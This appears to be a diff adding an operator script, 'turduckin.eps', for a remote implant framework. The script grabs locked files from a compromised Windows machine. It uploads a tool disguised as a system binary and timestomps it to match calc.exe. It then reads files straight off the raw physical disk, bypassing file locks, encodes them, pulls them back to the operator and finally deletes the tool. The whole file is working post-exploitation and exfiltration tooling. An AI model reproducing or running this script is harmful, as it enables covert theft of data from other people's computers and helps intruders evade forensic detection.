@@ -1,0 +1,161 @@
+#-------------------------------------------------------------------------------
+# File: turduckin.eps
+# Description: runs turduckin to grab a locked file.
+#
+# 19 May 2009  Created....
+#
+#-------------------------------------------------------------------------------
+@include "_File.dsi";
+@include "Ops_GenericFunctions.dsi";
+
+string $temppath;
+string $tempfile = "at0.tmp";
+
+string $resources;
+Ops_GetResourcePath($resources);
+
+string $localTool = "$resources\\Tools\\td.exe";
+Ops_GetTempPath($temppath);
+
+# find a temp file we can use
+if (_FileExists("$temppath\\$tempfile")) {
+	echo "Temp file already exists, bailing.";
+	return false;
+}
+
+string $ScriptsDir;
+Ops_GetScriptsPath($ScriptsDir);
+
+@echo on;
+
+string $remoteToolName = "";
+GetEnv("remoteToolName", $remoteToolName);
+
+string $sSysPath;
+Ops_GetSystemPath($sSysPath);
+
+if ($remoteToolName == "") {
+	$remoteToolName="$sSysPath\\cmdl16.exe";
+} 
+
+if (!prompt("Do you want to upload the tool as \"$remoteToolName\" ?")) {
+	GetInput("What do you want to upload the tool as?", $remoteToolName);
+}
+
+SetEnv("remoteToolName", "$remoteToolName");
+
+string $split;
+SplitPath("$remoteToolName", $split);
+
+
+while (`put $localTool -name $remoteToolName` == false) {
+	if (prompt("File exists, delete \"$remoteToolName\"?")) {
+		`delete -file "$split[0]\\$split[1]"`;
+		sleep(200);
+	} else {
+		return false;
+	}
+}
+@echo off;
+`matchfiletimes -src $sSysPath\\calc.exe -dst $remoteToolName`;
+
+bool $keepGoing = true;
+
+while ($keepGoing) {
+
+@record on;
+`run -command "$remoteToolName ltop" -redirect`;
+@record off;
+@echo on;
+
+
+
+string $offsetAndDrive;
+GetInput("fill this in: \"-o 63 \\\\.\\PhysicalDrive0\"", $offsetAndDrive);
+string $fileToGet;
+GetInput("what is the path to the file?", $fileToGet);
+
+string $fileParts;
+RegExSplit(":", $fileToGet, 0, $fileParts);
+string $folders;
+RegExSplit("\\\\", $fileParts[1], 0, $folders);
+
+string $driverLetter = "$fileParts[0]";
+string $pathNoDrive = "$folders[0]";
+string $blah;
+int $i=1;
+while ($i < Sizeof($folders)) {
+	$pathNoDrive = "$pathNoDrive/$folders[$i]";
+	$i++;
+}
+
+`run -command "cmd /c $remoteToolName ifind -n \\"$pathNoDrive\\" $offsetAndDrive | $remoteToolName xargs $remoteToolName icat $offsetAndDrive | $remoteToolName epc > \\"$temppath\\$tempfile\\"" -redirect`;
+
+@record on;
+if (`foreground get -mask "$tempfile" -path "$temppath" -realpath "$fileToGet"`) {
+	
+	string $localname, $localdir;
+	GetCmdData("FileLocalName::LocalName", $localname);
+	GetCmdData("LocalGetDirectory::Path", $localdir);
+	
+	if (!`delete -file "$temppath\\$tempfile"`) {
+		echo "!! Could not delete tmp file !!";
+		pause;
+	}
+
+	echo "Local name is %_sgEnv{'log_path'}\\$localdir\\$localname";
+	
+	
+	############################################################
+	# Change the local name from ~at0.tmp
+	############################################################
+	# Local naming is screwy, skip this and keep as at0
+	#string $newFilename = split($tempfile,$localname);
+	#string $origFilename = splitpath($fileToGet);
+	
+	#$newFilename = "$origFilename[1]$newFilename[1]";
+	string $newFilename = "new_$localname";
+	#echo "";
+	#echo "Renaming Get_Files\\$localname -> Get_Files\\$newFileName";
+	`local run -command "cmd /c $localTool cat \\"%_sgEnv{'log_path'}\\$localdir\\$localname\\" | $localTool epc > \\"%_sgEnv{'log_path'}\\$localdir\\$newFileName\\"" -redirect`;
+	# move it back to the original name
+	`local run -command "cmd /c attrib -R \\"%_sgEnv{'log_path'}\\$localdir\\$localname\\" && move /Y \\"%_sgEnv{'log_path'}\\$localdir\\$newFileName\\" \\"%_sgEnv{'log_path'}\\$localdir\\$localname\\" && attrib +R \\"%_sgEnv{'log_path'}\\$localdir\\$localname\\""`;
+	
+	#`local move "Get_Files\\$localname" "Get_Files\\$newFileName"`;
+
+	#`local dir "Get_Files\\$localname"`;
+	#int $size1;
+	#GetCmdData("size", $size1);
+	#`local dir "Get_Files\\$newFileName"`;
+	#int $size2;
+	#GetCmdData("size", $size2);
+	#if ($size1 == $size2) {
+	#	`local run -command "cmd /c del \\"Get_Files\\$localname\\"" -redirect`;
+	#} else {
+	#	echo "SOMETHING WENT WRONG WITH DECRYPTION!";
+	#}
+
+
+	############################################################
+	# Set a variable for the local filename so other scripts can access the data
+	############################################################
+	#SetCmdData(string,"LOCALNAME",$newFileName);
+
+	echo "";
+	#echo "\nSuccessful CopyGet (currently in \"$curpath\"): \"$fileToGet\" => \"$temppath\\$tempfile\" (local \"$newFileName\")";
+	echo "Successful uberget of $fileToGet";
+
+}
+
+@record off;
+
+if (!prompt("Do you want to get another file?")) {
+	break;
+}
+
+}
+
+
+`delete -file "$split[0]\\$split[1]"`;
+
+return true;
